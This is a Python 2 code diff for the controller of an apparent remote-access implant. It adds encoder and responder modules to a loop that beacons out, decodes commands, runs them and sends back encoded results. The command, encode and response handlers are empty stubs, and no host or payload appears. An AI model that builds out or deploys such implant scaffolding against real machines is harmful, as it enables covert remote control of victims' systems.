@@ -20,16 +20,19 @@ MODULE_PATH = 'implant_modules'
 BEACON_PKG = MODULE_PATH + '.' + 'beacons'
 COMMAND_PKG = MODULE_PATH + '.' +'commands'
 DECODER_PKG = MODULE_PATH + '.' +'decoders'
+ENCODER_PKG = MODULE_PATH + '.' + 'encoders'
+RESPONDER_PKG = MODULE_PATH + '.' + 'responders'
 
 class Controller:
     
     beacon_map = {}
-    decoder_list = {}
+    decoder_list = {} # list
     command_map = {}
+    encoder_list = {} # list
     response_map = {}
     
-    def __init__(self, beacons, commands, decoders):
-        self.build_handlers(beacons, commands, decoders)
+    def __init__(self, beacons, commands, decoders, encoders, responders):
+        self.build_handlers(beacons, commands, decoders, encoders, responders)
     
     # ###############
     # UTILITIES
@@ -92,13 +95,23 @@ class Controller:
     def build_decoder_handler(self, decoders):
         
         self.decoder_list = self.abstract_builder(DECODER_PKG, decoders, True) #return a list
+        
+    def build_encoder_handler(self, encoders):
+        
+        self.encoder_list = self.abstract_builder(ENCODER_PKG, encoders, True) #return a list
+        
+    def build_responder_handler(self, responders):
     
-    def build_handlers(self, beacons, commands, decoders):
+        self.response_map = self.abstract_builder(RESPONDER_PKG, responders)
+    
+    def build_handlers(self, beacons, commands, decoders, encoders, responders):
         # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
         
         self.build_beacon_handler(beacons)
         self.build_command_handler(commands)
         self.build_decoder_handler(decoders)
+        self.build_encoder_handler(encoders)
+        self.build_responder_handler(responders)
     
     # ###############
     # HANDLER CALLERS
@@ -181,22 +194,27 @@ class Controller:
     def handle_command(self, command, params):
         pass
     
-    def handle_response(self, results):
+    def handle_encode(self, results):
+        pass
+    
+    def handle_response(self, encoded_results):
         pass
     
     def handle(self, nodes):
         
         try:
-            print "Controller: trying to beacon..."
+            print "[Controller]> beaconing..."
             # Send command to beacon handler
             success, encoded_data = self.handle_beacon(nodes)
             
+            print "[Controller]> decoding..."
             # Send response to decoders
             if success:
                 success, decoded_data = self.handle_decode(encoded_data)
             else:
                 raise
             
+            print "[Controller]> calling command..."
             # Process command
             if success:
                 command, params = decoded_data
@@ -204,9 +222,17 @@ class Controller:
             else:
                 raise
             
+            print "[Controller]> encoding results..."
+            # encode response here
+            if success:
+                success, encoded_results = self.handle_encode(results)
+            else:
+                raise
+            
+            print "[Controller]> sending results..."
             # Send response
             if success:
-                success = self.handle_response(results)
+                success = self.handle_response(encoded_results)
             else:
                 raise
         
